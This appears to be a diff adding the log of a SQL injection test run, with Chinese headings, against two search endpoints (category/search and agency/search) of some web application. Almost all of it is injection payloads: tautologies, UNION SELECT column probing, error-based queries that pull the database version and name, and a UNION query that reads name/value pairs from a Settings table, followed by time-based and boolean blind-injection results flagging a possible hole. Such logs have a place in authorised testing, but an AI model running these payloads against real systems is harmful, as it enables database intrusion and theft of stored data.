@@ -1,0 +1,42 @@
+=== 深度SQL注入测试 ===
+[1] 测试 category/search
+Payload: ' OR '1'='1
+
+Payload: ' OR 1=1--
+
+Payload: ' OR 1=1#
+
+Payload: ' UNION SELECT NULL--
+
+Payload: ' UNION SELECT NULL,NULL--
+
+Payload: ' UNION SELECT NULL,NULL,NULL--
+
+Payload: '; SELECT * FROM Users--
+
+Payload: ' AND 1=CONVERT(int,(SELECT @@version))--
+
+Payload: ' AND 1=CONVERT(int,(SELECT DB_NAME()))--
+
+Payload: ' OR EXISTS(SELECT * FROM Settings)--
+
+Payload: ' UNION SELECT name,value FROM Settings--
+
+
+[2] 测试 agency/search
+Payload: ' OR '1'='1
+
+Payload: ' OR 1=1--
+
+Payload: ' OR 1=1#
+
+Payload: ' UNION SELECT NULL--
+
+Payload: ' UNION SELECT NULL,NULL--
+
+
+[3] 时间盲注测试
+延迟: 0秒 (期望>5秒表示有SQL注入)
+
+[4] Boolean盲注测试
+可能存在SQL注入（响应相同）
